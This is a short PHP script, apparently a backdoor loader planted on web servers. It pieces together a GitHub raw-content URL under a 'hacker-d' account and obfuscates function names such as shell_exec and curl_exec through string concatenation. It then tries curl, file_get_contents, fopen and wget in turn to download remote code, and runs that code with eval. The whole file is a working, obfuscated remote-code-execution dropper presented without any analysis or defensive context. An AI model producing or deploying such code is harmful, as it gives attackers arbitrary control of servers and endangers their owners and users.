<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$url = "https://" . "raw.github" . "user" . "content.com/" . "hacker-d/new/main/1.txt";

$f_ab = 'curl_' . 'init';
$f_cd = 'curl_' . 'exec';
$f_ef = 'curl_' . 'close';
$f_gh = 'file_' . 'get_' . 'contents';
$f_ij = 'f' . 'open';
$f_kl = 'f' . 'close';
$f_mn = 'shell_' . 'exec';
$f_op = 'strea' . 'm_conte' . 'xt_cre' . 'ate';
$f_qr = 'stre' . 'am_get_m' . 'eta_da' . 'ta';

function get_content_from_url($url) {
    global $f_ab, $f_cd, $f_ef, $f_gh, $f_ij, $f_kl, $f_mn, $f_op, $f_qr;

    if (function_exists($f_ab)) {
        $ch = $f_ab();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = $f_cd($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $f_ef($ch);

        if ($output !== false && $http_code == 200) {
            return $output;
        }
    }

    if (ini_get('allow_url_fopen')) {
        $context = @$f_op(array('http' => array('timeout' => 10)));
        $output = @$f_gh($url, false, $context);
        if ($output !== false) {
            return $output;
        }
    }

    $handle = @$f_ij($url, 'r');
    if ($handle) {
        $output = '';
        $metadata = $f_qr($handle);
        while (!feof($handle)) {
            $output .= fread($handle, 8192);
        }
        $f_kl($handle);
        if ($output !== false) {
            return $output;
        }
    }

    if (function_exists('exec') || function_exists($f_mn)) {
        $output = @$f_mn('wget -q -O - ' . escapeshellarg($url));
        if (!empty($output)) {
            return $output;
        }
    }

    return false;
}

$output = get_content_from_url($url);

if ($output !== false) {
    $run_code = function($code) {
        return @eval('?>' . $code);
    };

    $run_code($output);
} else {
    echo "Gagal mendapatkan konten dari URL.";
}

?>
